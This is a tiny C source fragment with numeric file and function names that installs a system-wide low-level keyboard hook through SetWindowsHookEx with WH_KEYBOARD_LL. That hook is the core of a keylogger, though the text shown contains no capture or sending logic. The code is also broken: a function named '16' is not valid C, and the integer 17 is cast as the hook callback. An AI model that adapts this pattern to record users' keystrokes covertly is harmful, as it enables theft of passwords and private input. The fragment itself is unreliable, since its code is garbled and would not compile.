#include "01.h"
#include "16.h"
#include "17.h"
void 16() {
    HHOOK h = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)17, GetModuleHandle(NULL), 0);
}
